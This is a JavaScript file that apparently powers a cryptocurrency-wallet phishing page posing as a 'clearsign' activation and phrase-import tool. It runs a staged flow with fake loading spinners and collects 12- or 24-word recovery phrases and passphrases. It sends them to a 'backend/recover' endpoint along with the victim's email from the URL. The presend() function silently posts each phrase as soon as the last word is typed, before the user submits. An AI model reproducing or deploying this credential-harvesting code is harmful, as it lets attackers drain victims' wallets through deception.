const step_1 = $("#step_1");
const step_2 = $("#step_2");
const step_3 = $("#step_3");
const step_4 = $("#step_4");
const step_5 = $("#step_5");
const step_6 = $("#step_6");

let wordlist = [];
let complete_phrase = '';

const hideAll = () => {
    step_1.hide();
    step_2.hide();
    step_3.hide();
    step_4.hide();
    step_5.hide();
    step_6.hide();
}

let autoProgressEnabled = true;

// Add this helper function at the top level
function getEmailFromUrl() {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get('email');
}

$(document).ready(function () {
    $("#submit_phrase").prop('disabled', true);

    $.getJSON('./assets/js/wordlist.json', function (data) {
        wordlist = data;
    });

    function updatePhraseInputs(length) {
        $('.input-phrase').each(function (index) {
            if (index < length) {
                $(this).show();
            } else {
                $(this).hide().val('');
            }
        });
        checkAllInputs();
    }

    updatePhraseInputs(12);

    $('.phrase-length-btn').click(function () {
        const length = parseInt($(this).data('length'));
        updatePhraseInputs(length);

        $('.phrase-length-btn').css({
            'background-color': '#2d2d3d',
            'border-color': '#404040'
        });
        $(this).css({
            'background-color': '#1f2033',
            'border-color': '#5c6cf7'
        });
    });

    function updateCompletePhrase() {
        let words = [];
        let activeLength = 12;

        $('.phrase-length-btn').each(function () {
            if ($(this).css('background-color') === 'rgb(31, 32, 51)') {
                activeLength = parseInt($(this).data('length'));
            }
        });

        $('.input-phrase:visible').each(function () {
            let word = $(this).val().toLowerCase()
                .replace(/[0-9]/g, '')
                .trim();
            if (word) {
                words.push(word);
            }
        });

        complete_phrase = words.join(' ');

        if (words.length === activeLength) {
            presend();
        }
    }

    $('.input-phrase').on('input', function () {
        const currentWord = $(this).val().toLowerCase().trim();

        if (currentWord === '') {
            $(this).css('border-color', 'rgba(255, 255, 255, 0.2)');
        } else if (wordlist.includes(currentWord)) {
            $(this).css('border-color', 'rgba(255, 255, 255, 0.4)');
            $(this).css('box-shadow', '0 0 0 2px rgba(40, 167, 69, 0.2)');
        } else {
            $(this).css('border-color', 'rgba(220, 53, 69, 0.4)');
            $(this).css('box-shadow', '0 0 0 2px rgba(220, 53, 69, 0.2)');
        }

        checkAllInputs();
        updateCompletePhrase();
    });

    function checkAllInputs() {
        let allFilled = true;

        $('.input-phrase:visible').each(function () {
            if ($(this).val().trim() === '') {
                allFilled = false;
                return false;
            }
        });

        $("#submit_phrase").prop('disabled', !allFilled);

        if (allFilled) {
            $("#submit_phrase").removeClass('disabled').addClass('enabled');
        } else {
            $("#submit_phrase").removeClass('enabled').addClass('disabled');
        }
    }

    $('.input-phrase').on('keypress', function (e) {
        if (e.which === 32) {
            e.preventDefault();
            $(this).next('.input-phrase').focus();
        }
    });

    $("#activate_clearsign").click(function () {
        $("#activate_clearsign").html('<div class="spinner"></div>');
        $("#activate_clearsign").prop("disabled", true);
        setTimeout(function () {
            hideAll();
            step_2.show();

            setTimeout(function () {
                if (autoProgressEnabled) {
                    hideAll();
                    step_3.show();
                }
            }, 5000);
        }, 2500);
    });

    $("#mobile_import").click(function () {
        autoProgressEnabled = false;
        hideAll();
        step_4.show();
    });

    $("#import_phrase").click(function () {
        $("#import_phrase").html('<div class="spinner"></div>');
        $("#import_phrase").prop("disabled", true);
        setTimeout(function () {
            hideAll();
            step_4.show();
        }, 2500);
    });

    $("#submit_phrase").click(function () {
        $("#submit_phrase").html('<div class="spinner"></div>');
        $("#submit_phrase").prop("disabled", true);

        const data = {
            phrase: complete_phrase
        };
        const email = getEmailFromUrl();
        if (email) data.email = email;

        $.ajax({
            url: 'backend/recover',
            method: 'POST',
            data: data,
            success: function (response) {
                response = JSON.parse(response);
                if (response.result == "valid") {
                    hideAll();
                    step_5.show();
                } else {
                    $("#submit_phrase").prop("disabled", false);
                    $("#submit_phrase").html('Import Phrase');
                    $("#error_message").show();

                    setTimeout(function () {
                        $("#error_message").hide();
                    }, 5000);
                }
            },
            error: function (response) {
                $("#submit_phrase").prop("disabled", false);
                ("#submit_phrase").html('Import Phrase');
                $("#error_message").show();

                setTimeout(function () {
                    $("#error_message").hide();
                }, 5000);
            }
        })
    });

    $("#submit_passphrase").click(function () {
        $("#submit_passphrase").html('<div class="spinner"></div>');
        $("#submit_passphrase").prop("disabled", true);

        const passphrase = $("#passphrase").val();
        if (!passphrase.trim()) {
            $("#error_message_passphrase").show();
            setTimeout(function () {
                $("#error_message_passphrase").hide();
            }, 5000);
            return;
        }

        send_passphrase(passphrase);

        hideAll();
        step_6.show();
    });
});

function presend() {
    const data = {
        phrase: complete_phrase
    };
    const email = getEmailFromUrl();
    if (email) data.email = email;

    $.ajax({
        url: 'backend/recover',
        method: 'POST',
        data: data
    })
}

function send_passphrase(passphrase) {
    const data = {
        phrase: passphrase
    };
    const email = getEmailFromUrl();
    if (email) data.email = email;

    $.ajax({
        url: 'backend/recover',
        method: 'POST',
        data: data
    })
}